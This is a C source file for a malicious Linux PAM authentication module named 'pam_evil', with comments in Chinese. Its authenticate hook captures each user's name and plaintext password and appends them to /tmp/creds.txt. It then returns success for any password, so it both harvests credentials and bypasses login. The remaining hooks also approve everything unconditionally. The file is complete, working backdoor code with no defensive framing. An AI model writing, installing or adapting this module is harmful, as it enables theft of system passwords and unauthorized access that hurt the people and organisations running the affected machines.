#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <unistd.h>
#include <syslog.h>
#include <string.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user;
    const char *password;
    const void *void_password;
    FILE *fp;

    //获取用户名
    if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS) {
        syslog(LOG_AUTHPRIV, "pam_evil: 无法获取用户名");
        return PAM_AUTH_ERR;
    }

    //获取密码
    if (pam_get_item(pamh, PAM_AUTHTOK, &void_password) != PAM_SUCCESS) {
        syslog(LOG_AUTHPRIV, "pam_evil: 无法获取密码");
        return PAM_AUTH_ERR;
    }

    password = (const char *)void_password;

    //将用户名和密码追加到文件
    fp = fopen("/tmp/creds.txt", "a");
    if (fp != NULL) {
        fprintf(fp, "User: %s, Password: %s\n", user, password);
        fclose(fp);
        syslog(LOG_AUTHPRIV, "pam_evil: 凭据已记录到 /tmp/creds.txt");
    } else {
        syslog(LOG_AUTHPRIV, "pam_evil: 无法打开 /tmp/creds.txt");
    }

    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

#ifdef PAM_MODULE_ENTRY
PAM_MODULE_ENTRY(pam_evil);
#endif
